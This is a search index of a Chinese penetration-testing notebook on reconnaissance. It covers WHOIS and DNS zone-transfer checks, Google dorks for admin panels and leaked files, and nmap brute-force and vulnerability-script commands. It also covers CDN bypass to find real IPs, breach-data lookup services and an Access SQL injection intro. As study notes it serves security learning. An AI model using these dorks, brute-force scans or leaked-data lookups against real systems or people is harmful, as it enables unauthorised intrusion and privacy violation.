{"./":{"url":"./","title":"前言","keywords":"","body":"Introduction "},"NoteBook/信息收集/":{"url":"NoteBook/信息收集/","title":"信息收集","keywords":"","body":""},"NoteBook/信息收集/域名信息收集/":{"url":"NoteBook/信息收集/域名信息收集/","title":"域名信息收集","keywords":"","body":""},"NoteBook/信息收集/域名信息收集/WhoIs查询.html":{"url":"NoteBook/信息收集/域名信息收集/WhoIs查询.html","title":"WhoIs查询","keywords":"","body":"Whois查询 指的是域名注册时留下的信息，比如留下管理员的名字、电话号码、邮箱 域名注册人可能就是管理员，可以尝试社工、套路、查询是不是注册了其他域名，扩大攻击范围 当你知道域名注册人的名字，可以尝试用这个名字查看这个注册名注册有哪些网站 正查：网站查询信息 反查：信息查询网站 域名Whois查询 - 站长之家 Whois 爱站 ip138 Whois Lookup ICANN Lookup 域名信息查询 - 腾讯云 新网 whois信息查询 IP WHOIS查询 - 站长工具 按域名搜索网络 - netcraft Whois命令查询 root@kali:/home/mpy# whois xuegod.cn Domain Name: xuegod.cn ROID: 20140908s10001s72166376-cn Domain Status: ok "},"NoteBook/信息收集/域名信息收集/备案信息.html":{"url":"NoteBook/信息收集/域名信息收集/备案信息.html","title":"备案查询","keywords":"","body":"备案信息 站长工具-ICP备案查询 站长工具-ICP批量备案查询 上海互联网安全综合服务网 SEO综合查询-爱站 工业和信息化部ICP/IP/域名信息备案管理 ICP备案查询网 美国企业查询备案 "},"NoteBook/信息收集/域名信息收集/信用信息查询.html":{"url":"NoteBook/信息收集/域名信息收集/信用信息查询.html","title":"信用信息查询","keywords":"","body":"信用信息查询 国家企业信用信息公示系统 悉知-全国企业信息查询 信用中国-个人信用查询搜索-企业信息查询搜索-统一社会信用代码查询 "},"NoteBook/信息收集/应用信息收集/":{"url":"NoteBook/信息收集/应用信息收集/","title":"应用信息收集","keywords":"","body":""},"NoteBook/信息收集/应用信息收集/应用信息收集.html":{"url":"NoteBook/信息收集/应用信息收集/应用信息收集.html","title":"应用收集","keywords":"","body":"应用信息收集 微信公众号、微博、应用程序、App 天眼查 七麦数据 AppStore "},"NoteBook/信息收集/子域名信息收集/":{"url":"NoteBook/信息收集/子域名信息收集/","title":"子域名信息收集","keywords":"","body":"通用型顶级域名 共6个 科研结构.ac 工商企业金融企业.com 教育机构.edu 政府部门.gov 互联网络信息中心和运行中心.net 用于非盈利组织.org 国家及地区顶级域 中国.cn 英国.uk 日本.jp 子域名（Subdomain Name） 凡顶级域名前加前缀的都是该顶级域名的子域名，而子域名根据技术的多少又分为二级子域名、三级子域名以及多级子域名 一级域名：qq.com 二级域名：ke.qq.com 三级域名：zx.ke.qq.com "},"NoteBook/信息收集/子域名信息收集/DNS历史记录.html":{"url":"NoteBook/信息收集/子域名信息收集/DNS历史记录.html","title":"DNS历史记录","keywords":"","body":" 通过字典拼接到子域名上去访问DNS服务器，如果DNS返回IP说明该子域名存在 历史记录查询 dnsdb viewdns 域名记录 A记录（Address）正向解析 A记录是将一个主机名（全称FQDN）和一个IP地址关联起来，大多数客户端程序默认的查询类型 例如：就是域名解析IP（mpy.com -> 12.12.12.11） PTR记录（Pointer） 反向解析 PTR记录将一个IP地址对应到主机名（全称域名FQDN），这些记录保存在in-addr.arpa域中 例如：IP解析域名（12.12.12.11 -> mpy.com） CNAME记录（Canonical Name）别名记录 别名记录，也成规范名字（Canonical Name），这种记录允许您将多台映射到同一台计算机上 例如：n.mpy.com -> 8.8.8.7，m.mpy.com -> 8.8.8.7 MX记录（Mail eXchange）邮件记录 MX记录是邮件记录，它指向一个邮件服务器，用于电子邮件系统发邮件时根据收信人的地址后缀来定位邮件服务器 当有多个MX记录（即有多个邮件服务器）时，则需要设置数值来确定其优先级，通过设置优先级数字来指明首选服务器，数字越小表示优先级越高 例如：mail.mpy.com NS记录（Name Server）域名服务器记录 NS（Name Server）记录是域名服务器记录，也称为授权服务器，用来指定该域名由哪个DNS服务器进行解析 例如：dns.mpy.com 域名解析过程 DNS域传送漏洞原理 DNS服务器分为：主服务器、备份服务器和缓存服务器。在主备服务器之间同步数据库，需要使用“DNS域传送”。域传送是指备份服务器从主服务器拷贝数据，并用得到的数据更新自身数据库 若DNS服务器配置不当，可能导致攻击者获取某个域的所有记录。造成整个网络的拓扑结构泄露给潜在的攻击者，包括一些安全性较低的内部主机，如测试服务器。同时，黑客可以快速的判定出某个特定zone的所有主机，收集域信息，选择攻击目标，找出未使用的IP地址，绕过基于网络的访问控制。 DNS域传送漏洞检测 nslookup 基本过程 1) nslookup #进入交互式shell 2) server dns.xx.yy.zz #设定查询将要使用的DNS服务器 3) ls xx.yy.zz #列出某个域中的所有域名 4) exit #退出 漏洞检验-不存在漏洞 > nslookup Server: lkwifi.cn Address: 192.168.68.1 *** lkwifi.cn can't find nslookup: Non-existent domain > server ss2.bjfu.edu.cn Default Server: ss2.bjfu.edu.cn Address: 202.204.112.67 > ls bjfu.edu.cn [ss2.bjfu.edu.cn] *** Can't list domain bjfu.edu.cn: Query refused The DNS server refused to transfer the zone bjfu.edu.cn to your computer. If this is incorrect, check the zone transfer security settings for bjfu.edu.cn on the DNS server at IP address 202.204.112.67. > exit 漏洞检验-存在漏洞 > nslookup > server dns1.xxx.edu.cn > ls xxx.edu.cn nmap 利用nmap漏洞检测脚本\"dns-zone-transfer\"进行检测 nmap --script dns-zone-transfer --script-args dns-zone-transfer.domain=xxx.edu.cn -p 53 -Pn dns.xxx.edu.cn --script dns-zone-transfer表示加载nmap漏洞检测脚本dns-zone-transfer.nse，扩展名.nse可省略 --script-args dns-zone-transfer.domain=xxx.edu.cn向脚本传递参数，设置列出某个域中的所有域名 -p 53 设置扫描53端口 -Pn 设置通过Ping发现主机是否存活 dig 使用说明 dig -h 漏洞测试 dig @dns.xxx.edu.cn axfr xxx.edu.cn axfr是q-type类型的一种: axfr类型是Authoritative Transfer的缩写，指请求传送某个区域的全部记录。 DNS域名解析 PING ping baidu.com root@kali:/home/mpy# ping baidu.com PING baidu.com (220.181.38.148) 56(84) bytes of data. 64 bytes from 220.181.38.148 (220.181.38.148): icmp_seq=1 ttl=128 time=68.5 ms NSLOOKUP nslookup baidu.com root@kali:/home/mpy# nslookup baidu.com Server: 192.168.30.2 Address: 192.168.30.2#53 Non-authoritative answer: Name: baidu.com Address: 39.156.69.79 Name: baidu.com Address: 220.181.38.148 DIG dig @服务器地址 需要查询的地址 any any：显示所有类型的域名记录（默认只显示A记录） root@kali:/home/mpy# dig baidu.com root@kali:/home/mpy# dig @8.8.8.8 baidu.com root@kali:/home/mpy# dig @8.8.8.8 baidu.com any root@kali:/home/mpy# dig @8.8.8.8 baidu.com any +noall +answer …… baidu.com. 7191 IN SOA dns.baidu.com. sa.baidu.com. 2012143570 300 300 2592000 7200 baidu.com. 21591 IN NS ns4.baidu.com. …… +noall +answer会显示的很整洁 root@kali:/home/mpy# dig @8.8.8.8 baidu.com any +noall +answer baidu.com. 7070 IN SOA dns.baidu.com. sa.baidu.com. 2012143570 300 300 2592000 7200 baidu.com. 21470 IN NS ns4.baidu.com. baidu.com. 21470 IN NS ns7.baidu.com. baidu.com. 21470 IN NS ns3.baidu.com. baidu.com. 21470 IN NS dns.baidu.com. baidu.com. 21470 IN NS ns2.baidu.com. baidu.com. 470 IN A 39.156.69.79 baidu.com. 470 IN A 220.181.38.148 baidu.com. 7070 IN MX 20 mx50.baidu.com. baidu.com. 7070 IN MX 10 mx.maillb.baidu.com. baidu.com. 7070 IN MX 15 mx.n.shifen.com. -x使用IP反查域名 root@kali:/home/mpy# dig -x 8.8.8.8 ; > DiG 9.16.6-Debian > -x 8.8.8.8 ;; global options: +cmd ;; Got answer: ;; ->>HEADER DNS bind版本查询 目的通过版本信息来查找相关版本漏洞的利用方式 DIG dig txt chaos VERSION.BIND @需要查询的域名 查询bind版本信息 root@kali:/home/mpy# dig txt chaos VERSION.BIND @nc3.dnsv4.com dnsdict6 -4 查询ipv4地址 -D 显示自带的字典 -t 线程数 最高32，默认是8 -d 显示NS MX域名信息 -S SRV服务名称猜解 -[smlxu] 选择字典大小 -s(mall=100),-m(edium=1419)(DEFAULT) -l(arge=2601),-x(treme=5886) or -u(ber=16724) root@kali:/home/mpy# dnsdict6 -m baidu.com "},"NoteBook/信息收集/子域名信息收集/网站收集.html":{"url":"NoteBook/信息收集/子域名信息收集/网站收集.html","title":"网站收集","keywords":"","body":"网站收集 ip138 站长工具 云悉 dns.bufferove phpinfo 子域名扫描 二级域名挖掘 dnsdumpster "},"NoteBook/信息收集/子域名信息收集/IP反查.html":{"url":"NoteBook/信息收集/子域名信息收集/IP反查.html","title":"IP反查","keywords":"","body":"IP反查 指可以通过一个已知域名的ip信息中的部分信息作为条件反过来查询与此条件相匹配的一系列其它域名列表情况 借此我们可以知道该注册人拥有哪些域名,或者说是拥有哪些站点,那些域名的注册信息具体是什么等等相关信息 Dnslytics IP反查 - 爱站网 IP反查 - 站长之家 "},"NoteBook/信息收集/子域名信息收集/权重综合查询.html":{"url":"NoteBook/信息收集/子域名信息收集/权重综合查询.html","title":"权重综合查询","keywords":"","body":"权重综合查询 爱站 站长工具 "},"NoteBook/信息收集/子域名信息收集/GoogleHack.html":{"url":"NoteBook/信息收集/子域名信息收集/GoogleHack.html","title":"GoogleHack","keywords":"","body":"Google Hacking GoogleHacking常用语法 1、intext：（仅针对Google有效） 把网页中的正文内容中的某个字符作为搜索的条件 2、intitle： 把网页标题中的某个字符作为搜索的条件 3、cache： 搜索搜索引擎里关于某些内容的缓存，可能会在过期内容中发现有价值的信息 4、filetype/ext： 指定一个格式类型的文件作为搜索对象 5、inurl： 搜索包含指定字符的URL 6、site： 在指定的(域名)站点搜索相关内容 GoogleHacking其他语法 1、引号 '' \" 把关键字打上引号后，把引号部分作为整体来搜索 2、or 同时搜索两个或更多的关键字 3、link 搜索某个网站的链接 link:baidu.com即返回所有和baidu做了链接的URL 4、info 查找指定站点的一些基本信息 GoogleHackingDatabase google-hacking-database GoogleHacking典型用法 管理后台地址 site:target.com intext:管理 | 后台 | 后台管理 | 登陆 | 登录 | 用户名 | 密码 | 系统 | 账号 | login | system site:target.com inurl:login | inurl:admin | inurl:manage | inurl:manager | inurl:admin_login | inurl:system | inurl:backend site:target.com intitle:管理 | 后台 | 后台管理 | 登陆 | 登录 上传类漏洞地址 site:target.com inurl:file site:target.com inurl:upload 注入页面 site:target.com inurl:php?id= 编辑器页面 site:target.com inurl:ewebeditor 目录遍历漏洞 site:target.com intitle:index.of SQL错误 site:target.com intext:\"sql syntax near\" | intext:\"syntax error has occurred\" | intext:\"incorrect syntax near\" | intext:\"unexpected end of SQL command\" | intext:\"Warning: mysql_connect()\" | intext:”Warning: mysql_query()\" | intext:”Warning: pg_connect()\" phpinfo() site:target.com ext:php intitle:phpinfo \"published by the PHP Group\" 配置文件泄露 site:target.com ext:.xml | .conf | .cnf | .reg | .inf | .rdp | .cfg | .txt | .ora | .ini 数据库文件泄露 site:target.com ext:.sql | .dbf | .mdb | .db 日志文件泄露 site:target.com ext:.log 备份和历史文件泄露 site:target.com ext:.bkf | .bkp | .old | .backup | .bak | .swp | .rar | .txt | .zip | .7z | .sql | .tar.gz | .tgz | .tar 公开文件泄露 site:target.com filetype:.doc | .docx | .xls | .xlsx | .ppt | .pptx | .odt | .pdf | .rtf | .sxw | .psw | .csv 邮箱信息 site:target.com intext:@target.com site:target.com 邮件 site:target.com email 社工信息 site:target.com intitle:账号 | 密码 | 工号 | 学号 | 身份证 "},"NoteBook/信息收集/子域名信息收集/Shodan.html":{"url":"NoteBook/信息收集/子域名信息收集/Shodan.html","title":"Shodan","keywords":"","body":"Shodan信息收集 Shodan不是在网上搜索网址，而是直接进入互联网背后的通道，Shodan可以说是暗黑版谷歌，一刻不停的在查找这所有和互联网关联的服务器、摄像头、打印机、路由器等等，还可以直接显示出目标的具体地理位置信息 搜索摄像头 输入webcam或网络摄像头 搜索指定IP地址 输入net:IP 搜索指定端口 port:80 搜做指定城市 city:城市 指定国家 country:国家 "},"NoteBook/信息收集/子域名信息收集/浏览器插件.html":{"url":"NoteBook/信息收集/子域名信息收集/浏览器插件.html","title":"浏览器插件","keywords":"","body":"浏览器插件 IP Whois & Flags Chrome & Websites Rating SysAdmin Tools Shodan Wappalyzer "},"NoteBook/信息收集/子域名信息收集/证书查询.html":{"url":"NoteBook/信息收集/子域名信息收集/证书查询.html","title":"证书查询","keywords":"","body":"证书透明度公开日志枚举 crt censys myssl 工具 Findomain Sublist3r（SSL Certificates）等 "},"NoteBook/信息收集/子域名信息收集/工具查找.html":{"url":"NoteBook/信息收集/子域名信息收集/工具查找.html","title":"工具查找","keywords":"","body":"OneForAll Layer Sublist3r subDomainsBrute dnsbrute Findomain "},"NoteBook/信息收集/指纹识别/":{"url":"NoteBook/信息收集/指纹识别/","title":"指纹识别","keywords":"","body":""},"NoteBook/信息收集/指纹识别/指纹识别.html":{"url":"NoteBook/信息收集/指纹识别/指纹识别.html","title":"指纹识别","keywords":"","body":"网站搜集 云悉 TideFinger BugScaner 数字观星 微步 whatweb-bugscanner whoami whatweb "},"NoteBook/信息收集/端口收集/":{"url":"NoteBook/信息收集/端口收集/","title":"端口扫描","keywords":"","body":"常用的端口利用及解析总结 端口 服务 利用 21 FTP/TFTP/VSFTPD 爆破/嗅探/溢出/后门 22 ssh远程连接 爆破/openssh漏洞 23 Telnet远程连接 爆破/嗅探/弱口令 25 SMTP邮件服务 邮件伪造 53 DNS域名解析系统 域传送/劫持/缓存投毒/欺骗 67/68 dhcp服务 劫持/欺骗 80/443 http/https web应用漏洞/心脏滴血 110 pop3 爆破/嗅探 139 Samba服务 爆破/未授权访问/远程命令执行 143 Imap协议 爆破161SNMP协议爆破/搜集目标内网信息 389 Ldap目录访问协议 注入/未授权访问/弱口令 445 smb ms17-010/端口溢出 512/513/514 Linux Rexec服务 爆破/Rlogin登陆 873 Rsync服务 文件上传/未授权访问 1080 socket 爆破 1352 Lotus domino邮件服务 爆破/信息泄漏 1433 mssql 爆破/注入/SA弱口令 1521 oracle 爆破/注入/TNS爆破/反弹shell2049Nfs服务配置不当 2181 zookeeper服务 未授权访问 2375 docker remote api 未授权访问 3306 mysql 爆破/注入 3389 Rdp远程桌面链接 爆破/shift后门 4848 GlassFish控制台 爆破/认证绕过 5000 sybase/DB2数据库 爆破/注入/提权 5432 postgresql 爆破/注入/缓冲区溢出 5632 pcanywhere服务 抓密码/代码执行 5900 vnc 爆破/认证绕过 6379 Redis数据库 未授权访问/爆破 7001/7002 weblogic java反序列化/控制台弱口令 8069 zabbix服务 远程命令执行/注入 8161 activemq 弱口令/写文件 8080/8089 Jboss/Tomcat/Resin 爆破/PUT文件上传/反序列化 8083/8086 influxDB 未授权访问 9000 fastcgi 远程命令执行 9090 Websphere 控制台爆破/java反序列化/弱口令 9200/9300 elasticsearch 远程代码执行 11211 memcached 未授权访问 27017/27018 mongodb 未授权访问/爆破 "},"NoteBook/信息收集/端口收集/网络空间搜索.html":{"url":"NoteBook/信息收集/端口收集/网络空间搜索.html","title":"网络空间搜索","keywords":"","body":"网络空间引擎搜索 shodan、FOFA、zoomeye FOFA为例 fofa.so "},"NoteBook/信息收集/端口收集/浏览器插件.html":{"url":"NoteBook/信息收集/端口收集/浏览器插件.html","title":"浏览器插件","keywords":"","body":"浏览器插件 通过Google、FireFox等插件的使用，收集主机端口开放信息 Shodan TCPIPUTILS DNSlytics fofa-view Wapplayzer "},"NoteBook/信息收集/端口收集/工具.html":{"url":"NoteBook/信息收集/端口收集/工具.html","title":"工具","keywords":"","body":"扫描工具 常用扫描工具 Nmap Masscan masnmapscan ZMap 御剑高速TCP端口扫描工具 御剑高速端口扫描工具 IISPutScanner IISPutScanner增强版-DotNetScan v1.1 Beta 常用扫描工具使用 Nmap 项目地址：https://github.com/nmap/nmap 扫描多个IP 扫描整个子网 nmap 192.168.6.1/24 nmap 192.168.1.1/16 nmap 192.168.1-30.1-254 nmap 192.168.1-254.6 扫描多个主机 namp 192.168.6.2 192.168.6.6 扫描一个小范围 nmap 192.168.6.2-10 扫描txt内的ip列表 nmap -iL text.txt 扫描除某个目标外 nmap 192.168.6.1/24 -exclude 192.168.6.25 绕过Firewalld扫描主机端口 通过不同的协议(TCP半连接、TCP全连接、ICMP、UDP等)的扫描绕过Firewalld的限制 nmap -sP 192.33.6.128 nmap -sT 192.33.6.128 nmap -sS 192.33.6.128 nmap -sU 192.33.6.128 nmap -sF 192.33.6.128 nmap -sX 192.33.6.128 nmap -sN 192.33.6.128 初步扫描端口信息 nmap -T4 -A -v -Pn 192.168.1.1/24 -p 21,22,23,25,80,81,82,83,88,110,143,443,445,512,513,514,1433,1521,2082,2083,2181,2601,2604,3128,3306,3389,3690,4848,5432,5900,5984,6379,7001,7002,8069,8080,8081,8086,8088,9200,9300,11211,10000,27017,27018,50000,50030,50070 -oN nmap_result.txt 扫描端口并且标记可以爆破的服务 nmap 127.0.0.1 --script=ftp-brute,imap-brute,smtp-brute,pop3-brute,mongodb-brute,redis-brute,ms-sql-brute,rlogin-brute,rsync-brute,mysql-brute,pgsql-brute,oracle-sid-brute,oracle-brute,rtsp-url-brute,snmp-brute,svn-brute,telnet-brute,vnc-brute,xmpp-brute 判断常见的漏洞并扫描端口 nmap 127.0.0.1 --script=auth,vuln 精确判断漏洞并扫描端口 nmap 127.0.0.1 --script=dns-zone-transfer,ftp-anon,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,http-backup-finder,http-cisco-anyconnect,http-iis-short-name-brute,http-put,http-php-version,http-shellshock,http-robots.txt,http-svn-enum,http-webdav-scan,iis-buffer-overflow,iax2-version,memcached-info,mongodb-info,msrpc-enum,ms-sql-info,mysql-info,nrpe-enum,pptp-version,redis-info,rpcinfo,samba-vuln-cve-2012-1182,smb-vuln-ms08-067,smb-vuln-ms17-010,snmp-info,sshv1,xmpp-info,tftp-enum,teamspeak2-version Masscan 项目地址：https://github.com/robertdavidgraham/masscan Masscan主要是真对全网进行端口扫描 Masscan+Nmap 有些时候网站的入口点属于非常规端口，因此是必须要做全端口扫描，做全端口扫描的时候由于namp发包量大经常出现各种问题，如端口扫描不全、获得信息不准等等，为了解决上述问题，这里提供一个masscan+nmap结合的方式进行快速扫描。 原理：使用masscan做全端口开放检测，检测出来端口信息后，用nmap进行服务信息识别。 使用：终端输入以下命令执行即可 # masscan 192.33.6.145 -p1-65535 --rate 1000 -oL ports # ports=$(cat ports | awk -F \" \" '{print $3}' | sort -n | tr '\\n' ',' | sed 's/,$//' | sed 's/^,,//') # nmap -sV -p $ports 192.33.6.145 masnmapscan 项目地址：https://github.com/hellogoldsnakeman/masnmapscan-V1.0 masnmapscan整合了masscan和nmap两款扫描器，masscan扫描端口，nmap扫描端口对应服务，二者结合起来实现了又快又好地扫描。并且加入了针对目标资产有防火墙的应对措施。 Zmap 项目地址：https://github.com/zmap/zmap Zmap主要是真对全网进行端口扫描 御剑高速TCP端口扫描工具 御剑高速端口扫描工具 "},"NoteBook/信息收集/敏感文件/":{"url":"NoteBook/信息收集/敏感文件/","title":"敏感文件","keywords":"","body":""},"NoteBook/信息收集/敏感文件/源码泄露.html":{"url":"NoteBook/信息收集/敏感文件/源码泄露.html","title":"源码泄露","keywords":"","body":"源码泄露 常见源码泄露 /.bzr/ /CVS/Entries /CVS/Root /.DS_Store MacOS自动生成 /.hg/ /.svn/ (/.svn/entries) /.git/ /WEB-INF/src/ /WEB-INF/lib/ /WEB-INF/classes/ /WEB-INF/database.properties /WEB-INF/web.xml Robots.txt 上述源码泄露在Github上都可以找到相应的利用工具 源码泄露扫描工具 将常见源码泄露加入字典配合FUZZ、御剑等扫描器进行扫描收集 源码泄露利用工具 .git源码泄露：https://github.com/lijiejie/GitHack .DS_Store泄露：https://github.com/lijiejie/ds_store_exp .bzr、CVS、.svn、.hg源码泄露：https://github.com/kost/dvcs-ripper "},"NoteBook/信息收集/敏感文件/备份文件泄露.html":{"url":"NoteBook/信息收集/敏感文件/备份文件泄露.html","title":"备份文件泄露","keywords":"","body":"备份文件泄漏 网站备份文件泄露常见名称 backup db data web wwwroot database www code test admin user sql 网站备份文件泄露常见后缀 .bak .html _index.html .swp .rar .txt .zip .7z .sql .tar.gz .tgz .tar 网站备份文件泄露扫描工具 常见扫描工具有：Test404网站备份文件扫描器 v2.0、ihoneyBakFileScan等 "},"NoteBook/信息收集/敏感文件/WAF识别.html":{"url":"NoteBook/信息收集/敏感文件/WAF识别.html","title":"WAF识别","keywords":"","body":"WAF识别 长亭safeline openRasp 安全狗 D盾 亚信安全 安恒waf老版本 Yxlink waf Imperva WAF 创宇盾 玄武盾 腾讯门神 阿里云 网防G01 "},"NoteBook/信息收集/敏感文件/JS获取敏感接口.html":{"url":"NoteBook/信息收集/敏感文件/JS获取敏感接口.html","title":"JS获取敏感接口","keywords":"","body":"JSFinder JSFinder是一款用作快速在网站的js文件中提取URL，子域名的工具。 安装 pip3 install requests bs4 git clone https://github.com/Threezh1/JSFinder.git 使用 python3 JSFinder.py -u http://www.mi.com python3 JSFinder.py -u http://www.mi.com -d LinkFinder 该工具通过网站中的JS文件来发现服务端、敏感信息、隐藏控制面板的URL链接等有用信息，可最大化地提高URL发现效率 安装 git clone https://github.com/GerbenJavado/LinkFinder.git cd LinkFinder python2 setup.py install 使用 在线JavaScript文件中查找端点的最基本用法，并将结果输出到results.html： python linkfinder.py -i https://example.com/1.js -o results.html CLI输出（不使用jsbeautifier，这使得它非常快）： pyhon linkfinder.py -i https://example.com/1.js -o cli 分析整个域及其JS文件： python linkfinder.py -i https://example.com -d Burp输入（在目标中选择要保存的文件，右键单击，Save selected items将该文件作为输入）： python linkfinder.py -i burpfile -b 枚举JavaScript文件的整个文件夹，同时查找以/ api /开头的终结点，并最终将结果保存到results.html： python linkfinder.py -i 'Desktop/*.js' -r ^/api/ -o results.html "},"NoteBook/信息收集/敏感文件/目录后台.html":{"url":"NoteBook/信息收集/敏感文件/目录后台.html","title":"目录后台","keywords":"","body":"目录后台 7kbscan-WebPathBrute dirbuster 御剑 "},"NoteBook/信息收集/敏感文件/公网网盘.html":{"url":"NoteBook/信息收集/敏感文件/公网网盘.html","title":"公网网盘","keywords":"","body":"公网网盘 公司员工可能把一些内部资料放在了公网网盘，然后被在线云网盘搜索的网站抓取了，我们就可以利用这个来对目标系统进行深入挖掘。 可以利用云网盘搜索工具搜集敏感文件，一般直接输入厂商名字进行搜索 凌风云搜索 地址：https://www.lingfengyun.com/ 小白盘搜索 地址：https://www.xiaobaipan.com/ 大力盘搜索 地址：https://www.dalipan.com/ 小不点搜索（微盘） 地址：https://www.xiaoso.net/ 百度网盘爬取开源工具 地址：https://github.com/gudegg/yunSpider "},"NoteBook/信息收集/敏感文件/公开文件.html":{"url":"NoteBook/信息收集/敏感文件/公开文件.html","title":"公开文件","keywords":"","body":"获取公开文件 snitch Snitch可以针对指定域自动执行信息收集过程。此工具可帮助收集可通过Web搜索引擎找到的指定信息。在渗透测试的早期阶段，它可能非常有用。 安装 git clone https://github.com/Smaash/snitch.git 使用 python2.7 snitch.py -C \"site:whitehouse.gov filetype:pdf\" -P 100 Google Hacking site:target.com filetype:.doc | .docx | .xls | .xlsx | .ppt | .pptx | .odt | .pdf | .rtf | .sxw | .psw | .csv "},"NoteBook/信息收集/敏感文件/邮箱收集.html":{"url":"NoteBook/信息收集/敏感文件/邮箱收集.html","title":"邮箱收集","keywords":"","body":"邮箱信息收集 Infoga Infoga可从不同的公共源网络（搜索引擎，pgp密钥服务器和shodan）收集电子邮件帐户信息（ip，主机名，国家/地区...）。是一个用法非常简单的工具，但是，对于渗透测试的早期阶段，或者只是为了了解自己公司在互联网上的可见性是非常有效的。 安装 git clone https://github.com/m4ll0k/Infoga.git /data/infoga cd /data/infoga pip3 install requests python3 infoga.py 使用 python3 infoga.py --domain site.com --source all -v 3 | grep Email | cut -d ' ' -f 3 | uniq | sed -n '/-/!p' python3 infoga.py --info emailtest@site.com python3 infoga.py --info emailtest@site.com -b Google Hacking site:target.com intext:@target.com site:target.com 邮件 site:target.com email "},"NoteBook/信息收集/敏感文件/历史网站.html":{"url":"NoteBook/信息收集/敏感文件/历史网站.html","title":"历史网站","keywords":"","body":"历史资产 wayback wayback会记录网站版本更迭，可以获取到之前版本的网站，可能会找到一些后来删除的敏感资产信息，或者一些漏洞 平台地址：https://web.archive.org/ "},"NoteBook/信息收集/敏感文件/查找真实IP.html":{"url":"NoteBook/信息收集/敏感文件/查找真实IP.html","title":"查找真实IP","keywords":"","body":"查找真实IP 国内外CDN 国内常见CDN 阿里云 腾讯云 百度云 网宿科技(ChinanNet Center) 蓝汛 金山云 UCloud 网易云 世纪互联 七牛云 京东云等 国外常见CDN Akamai(阿卡迈) Limelight Networks(简称LLNW) AWS Cloud(亚马逊) Google(谷歌) Comcast(康卡斯特) 发现CDN 全国PING Ping检测-站长工具 17CE ipip (支持国内、国外) 绕过CDN 内部邮箱源 一般的邮件系统都在内部，没有经过CDN的解析，通过利用目标网站的邮箱注册、找回密码或者RSS订阅等功能，查看邮件、寻找邮件头中的邮件服务器域名IP，ping这个邮件服务器的域名,就可以获得目标的真实IP。 注意：必须是目标自己的邮件服务器，第三方或公共邮件服务器是没有用的 国外请求 很多时候国内的CDN对国外得覆盖面并不是很广，故此可以利用此特点进行探测。通过国外代理访问就能查看真实IP了，或者通过国外的DNS解析，可能就能得到真实的IP。 国际Ping 国际ping测试站点 ipip ASM 测试站点：www.yeah.net 国外DNS解析 世界各地DNS服务器地址大全 分站域名&C段查询 很多网站主站的访问量会比较大，所以主站都是挂CDN的，但是分站可能没有挂CDN,可以通过ping二级域名获取分站IP， 可能会出现分站和主站不是同一个IP但在同一个C段下面的情况，从而能判断出目标的真实IP段。 C段查询 在线查询 https://phpinfo.me/bing.php 工具 K8_C段旁注工具6.0、nmap、IISPutScanner、小米范WEB查找器 等 小米范WEB查找器：http://pan.baidu.com/s/1pLjaQKF 网络资产搜索引擎 Fofa、Shodan、ZoomEye 利用这些网络空间资产搜索引擎来搜索暴露在外的端口信息 利用语法搜索C段信息 网站漏洞 通过网站的信息泄露如phpinfo泄露，github信息泄露，命令执行等漏洞获取真实ip。 一些测试文件 phpinfo、test等 SSRF漏洞 服务器主动向外发起连接，找到真实IP地址 查询域名解析记录 一般网站从部署开始到使用cdn都有一个过程，周期如果较长的话 则可以通过这类历史解析记录查询等方式获取源站ip，查看IP与域名绑定的历史记录，可能会存在使用CDN前的记录。 在线网站查询 dnsdb NETCRAFT viewdns threatbook securitytrails 目标网站APP应用 如果目标网站有自己的App，可以尝试利用Fiddler或Burp Suite抓取App的请求，从里面找到目标的真实IP。 网络空间引擎搜索 shodan、FOFA、zoomeye "},"NoteBook/信息收集/漏洞公共库/":{"url":"NoteBook/信息收集/漏洞公共库/","title":"漏洞公共库","keywords":"","body":""},"NoteBook/信息收集/漏洞公共库/国内.html":{"url":"NoteBook/信息收集/漏洞公共库/国内.html","title":"国内","keywords":"","body":"国内 国家信息安全漏洞库 国家信息安全漏洞共享平台 SeeBug 信息安全漏洞门户 VULHUB 数字观星 NSFOCUS绿盟科技 BugScan--漏洞插件社区 漏洞列表 | 教育行业漏洞报告平台（Beta） 工控系统行业漏洞库平台 exp库-打造中文最大exploit库 乌云漏洞库 "},"NoteBook/信息收集/漏洞公共库/国外.html":{"url":"NoteBook/信息收集/漏洞公共库/国外.html","title":"国外","keywords":"","body":"国外 Exploit-db Sploitus | Exploit & Hacktool Search Engine packetstorm SecurityFocus cxsecurity rapid7 Vulnerability & Exploit Database Most recent entries - CVE-Search CVE security vulnerability database. Security vulnerabilities, exploits CVE mitre - Search CVE List 美国官方工控数据库 ICS-CERT Landing | CISA 路由器漏洞搜索 Routerpwn - One click exploits, generators, tools, news, vulnerabilities, poc "},"NoteBook/信息收集/社工库/":{"url":"NoteBook/信息收集/社工库/","title":"社工库","keywords":"","body":""},"NoteBook/信息收集/社工库/用户注册信息.html":{"url":"NoteBook/信息收集/社工库/用户注册信息.html","title":"用户注册信息","keywords":"","body":"用户注册信息 通过用户的一些信息（Mail、Name、ID、Tel）查询用户注册过哪些应用 REG007 检查160个社交网络上的注册情况 Check Usernames - Social Media Username Availability 检查用户名注册情况在500个主流网站上 KnowEm用户名搜索：社交媒体，域名和商标 检查用户名注册情况，同时检查注册过哪些域名 Namechk | Username, Domain, and Trademark Search | Username Registration "},"NoteBook/信息收集/社工库/IP信息.html":{"url":"NoteBook/信息收集/社工库/IP信息.html","title":"IP信息","keywords":"","body":"IP信息 通过IP地址获取位置信息 IP地址查询chaipip 高精度IP定位 IP查询IPIP.NET ip2location maxmind ip138 ip.cn "},"NoteBook/信息收集/社工库/社工库.html":{"url":"NoteBook/信息收集/社工库/社工库.html","title":"社工库","keywords":"","body":"社工库 https://dehashed.com/ https://aleph.occrp.org/ https://www.blackbookonline.info/ http://pwndb2am4tzkvold.onion/ TG-Robot:@shegongkubot "},"NoteBook/信息收集/社工库/工具.html":{"url":"NoteBook/信息收集/社工库/工具.html","title":"工具","keywords":"","body":"工具 social-engineer-toolkit "},"NoteBook/SQL注入/":{"url":"NoteBook/SQL注入/","title":"SQL注入","keywords":"","body":""},"NoteBook/SQL注入/Access数据库/":{"url":"NoteBook/SQL注入/Access数据库/","title":"Access","keywords":"","body":" 注入本质 把用户输入的数据当做代码执行 注入条件 第一：用户能够控制输入 第二：原本要执行的代码，拼接了用户输入的数据然后进行执行 Access注入 Access没有系统自带库 在每个查询语句后面都要带表名 第一种方法是靠强猜一些常用的表名（admin、users、job、news） 第二种方法是利用exists(select * from 常见的表名)，如果有数据会无回显，没有就会报错，通过burp加载字典来查看表名 